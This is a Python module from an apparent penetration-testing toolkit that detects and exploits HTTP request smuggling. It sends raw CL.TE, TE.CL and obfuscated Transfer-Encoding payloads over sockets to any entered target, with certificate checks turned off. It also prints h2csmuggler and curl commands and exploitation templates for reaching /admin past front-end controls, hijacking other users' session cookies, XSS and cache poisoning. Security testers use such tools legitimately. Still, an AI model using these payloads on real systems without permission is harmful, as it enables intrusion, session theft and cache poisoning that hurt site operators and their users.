"""
modules/http_smuggling.py
tmrswrr - HTTP Request Smuggling
CL.TE, TE.CL, H2.TE detection
"""
import os
import re
import shutil
import time

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_and_print,
    section,
    success,
)


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def _host_port(url: str) -> tuple[str, int, bool]:
    m = re.match(r"(https?)://([^/:]+)(?::(\d+))?", url)
    if not m:
        return url, 80, False
    scheme = m.group(1)
    host   = m.group(2)
    port   = int(m.group(3)) if m.group(3) else (443 if scheme == "https" else 80)
    tls    = scheme == "https"
    return host, port, tls


def _raw_request(url: str, raw: str, timeout: int = 10) -> tuple[str, float]:
    """Send a raw HTTP/1.1 request over a socket. Returns (response, elapsed)."""
    import socket
    import ssl
    host, port, tls = _host_port(url)
    start = time.time()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(raw.encode())
        resp = b""
        sock.settimeout(timeout)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except Exception:
            pass
        sock.close()
        elapsed = time.time() - start
        return resp.decode("utf-8", errors="replace"), elapsed
    except Exception as e:
        return f"[Socket error: {e}]", time.time() - start


def cl_te_test():
    section("CL.TE - Content-Length vs Transfer-Encoding Smuggling")
    url = _target()
    host, port, tls = _host_port(url)

    info("Sending CL.TE timing probe (expect ~10s delay if vulnerable)...")
    info("Technique: backend uses Transfer-Encoding, frontend uses Content-Length")

    # Classic CL.TE timing payload - sends incomplete chunk that hangs backend
    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"1\r\n"
        f"Z\r\n"
        f"0\r\n"
        f"\r\n"
    )

    resp, elapsed = _raw_request(url, raw, timeout=12)

    if elapsed >= 9:
        success(f"CL.TE SMUGGLING CONFIRMED - response took {elapsed:.1f}s (expected ~10s delay)")
        add_vuln("HTTP Request Smuggling (CL.TE)", "Critical", "A05:2021",
                 f"Timing-based detection: {elapsed:.1f}s delay", url)
    else:
        print(f"  {DIM}[-] CL.TE timing probe: {elapsed:.1f}s (no delay){RST}")
        print(f"  {SOFT_WHITE}Response: {resp[:200]}{RST}")

    # Differential response test
    info("Sending CL.TE differential response probe...")
    raw2 = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 49\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"e\r\n"
        f"q=smuggling&x=\r\n"
        f"0\r\n"
        f"\r\n"
        f"GET /404smuggle HTTP/1.1\r\n"
        f"Foo: x"
    )
    resp2, elapsed2 = _raw_request(url, raw2, timeout=10)
    if "404smuggle" in resp2 or "/404smuggle" in resp2:
        success("CL.TE DIFFERENTIAL CONFIRMED - smuggled request reflected in response!")
        add_vuln("HTTP Request Smuggling (CL.TE)", "Critical", "A05:2021",
                 "Smuggled path /404smuggle reflected in response", url)
    else:
        print(f"  {DIM}[-] CL.TE differential: no smuggled path reflected{RST}")


def te_cl_test():
    section("TE.CL - Transfer-Encoding vs Content-Length Smuggling")
    url = _target()
    host, port, tls = _host_port(url)

    info("Sending TE.CL timing probe (expect ~10s delay if vulnerable)...")
    info("Technique: frontend uses Transfer-Encoding, backend uses Content-Length")

    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"X"
    )
    resp, elapsed = _raw_request(url, raw, timeout=12)

    if elapsed >= 9:
        success(f"TE.CL SMUGGLING CONFIRMED - {elapsed:.1f}s delay")
        add_vuln("HTTP Request Smuggling (TE.CL)", "Critical", "A05:2021",
                 f"Timing-based: {elapsed:.1f}s delay", url)
    else:
        print(f"  {DIM}[-] TE.CL timing: {elapsed:.1f}s{RST}")

    # TE.CL differential
    info("Sending TE.CL differential probe...")
    raw2 = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 3\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"8\r\n"
        f"smuggled\r\n"
        f"0\r\n"
        f"\r\n"
    )
    resp2, elapsed2 = _raw_request(url, raw2, timeout=10)
    print(f"  Response HTTP: {resp2.splitlines()[0] if resp2 else 'none'}")
    print(f"  Elapsed: {elapsed2:.1f}s")


def te_obfuscation():
    section("TE OBFUSCATION - Hidden Transfer-Encoding Headers")
    url = _target()
    host, port, tls = _host_port(url)

    info("Testing Transfer-Encoding header obfuscation variants...")
    info("Goal: get front-end and back-end to disagree on which TE header is authoritative")

    obfuscations = [
        ("Tab-prefixed",    "Transfer-Encoding: \tchunked"),
        ("Space after colon", "Transfer-Encoding:  chunked"),
        ("Null byte",       "Transfer-Encoding: chunked\x00"),
        ("X-header before","X-Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked"),
        ("Obfuscated word", "Transfer-Encoding: xchunked"),
        ("Wrapped",         "Transfer-Encoding:\n  chunked"),
    ]

    for name, te_header in obfuscations:
        raw = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"{te_header}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"0\r\n"
            f"\r\n"
        )
        resp, elapsed = _raw_request(url, raw, timeout=12)
        status = resp.splitlines()[0] if resp else "?"
        symbol = NEON_GRN + "!" + RST if elapsed > 8 else DIM + "-" + RST
        print(f"  [{symbol}] {name:<25} {elapsed:.1f}s  {status}")
        if elapsed > 8:
            add_vuln(f"HTTP Smuggling via TE Obfuscation ({name})", "Critical", "A05:2021",
                     f"TE obfuscation variant '{name}' causes {elapsed:.1f}s delay", url)


def http2_downgrade():
    section("H2.TE / HTTP/2 Downgrade Smuggling")
    url = _target()

    info("HTTP/2 smuggling requires a proxy tool or h2csmuggler.")
    print(f"""
  {NEON_CYN}H2.TE Smuggling Explanation:{RST}
    Front-end: HTTP/2 (strips Transfer-Encoding headers)
    Back-end:  HTTP/1.1 (uses TE: chunked)
    Attack:    Inject TE header into HTTP/2 request via header injection

  {NEON_CYN}Using h2csmuggler (if installed):{RST}
    pip install h2csmuggler
    h2csmuggler --smuggle -x GET / -H "Foo: bar" {url}

  {NEON_CYN}Proxy tool approach:{RST}
    1. Send request to Repeater
    2. Change to HTTP/2
    3. Add header: Transfer-Encoding: chunked
    4. Add body: 0\\r\\n\\r\\nGET /smuggled HTTP/1.1\\r\\nFoo: x
    5. Observe if /smuggled appears in next response

  {NEON_CYN}Detection via timing:{RST}
    curl -sk --http2 -X POST {url} \\
      -H "Transfer-Encoding: chunked" \\
      -d $'1\\r\\nZ\\r\\n0\\r\\n\\r\\n' \\
      -w "\\nTime: %{{time_total}}s\\n"
""")
    if shutil.which("h2csmuggler"):
        if prompt("Run h2csmuggler? [y/N]").lower() == "y":
            run_and_print(f"h2csmuggler --smuggle -x GET / {url}", timeout=30)


def smuggling_impact():
    section("SMUGGLING IMPACT EXPLOITATION")
    print(f"""
  {NEON_CYN}If HTTP Request Smuggling is confirmed, exploit with:{RST}

  {NEON_GRN}[1] Bypass Front-End Security Controls:{RST}
    POST / HTTP/1.1
    Content-Length: 116
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 10

    x=

  {NEON_GRN}[2] Capture Other Users' Requests (steal sessions):{RST}
    GET / HTTP/1.1
    ...

    0

    POST /post/comment HTTP/1.1
    Cookie: session=VICTIM_TOKEN (harvested from next request)

  {NEON_GRN}[3] Reflected XSS via Smuggling (no user interaction):{RST}
    Inject XSS payload into a parameter that gets reflected
    back to the next victim's request

  {NEON_GRN}[4] Cache Poisoning via Smuggling:{RST}
    Smuggle a poisoned response into the shared cache
    affecting all subsequent users
""")


def run():
    print_banner("HTTP REQUEST SMUGGLING",
                 "CL.TE · TE.CL · TE Obfuscation · H2.TE")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} CL.TE Detection  {SOFT_WHITE}(Content-Length/Transfer-Encoding conflict){RST}
  {NEON_CYN}[2]{RST} TE.CL Detection  {SOFT_WHITE}(Transfer-Encoding/Content-Length conflict){RST}
  {NEON_CYN}[3]{RST} TE Obfuscation   {SOFT_WHITE}(hidden TE header variants){RST}
  {NEON_CYN}[4]{RST} HTTP/2 Downgrade {SOFT_WHITE}(H2.TE - h2csmuggler / Burp){RST}
  {NEON_CYN}[5]{RST} Exploitation Techniques {SOFT_WHITE}(bypass, session capture, XSS){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            cl_te_test()
        elif c == "2":
            te_cl_test()
        elif c == "3":
            te_obfuscation()
        elif c == "4":
            http2_downgrade()
        elif c == "5":
            smuggling_impact()
        save_session()
